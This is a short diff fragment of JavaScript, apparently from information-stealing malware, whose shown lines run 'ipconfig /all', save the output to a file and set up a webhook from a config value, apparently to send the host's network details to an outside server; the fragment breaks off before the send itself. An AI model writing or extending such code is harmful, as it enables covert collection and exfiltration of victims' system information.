@@ -1,4 +1,3 @@
-
 exec("ipconfig /all", (error, stdout, stderr) => {
 	fs.writeFile('ipconfig.txt', stdout, async function (err) {
 	const hook = new Webhook(config.webhook);
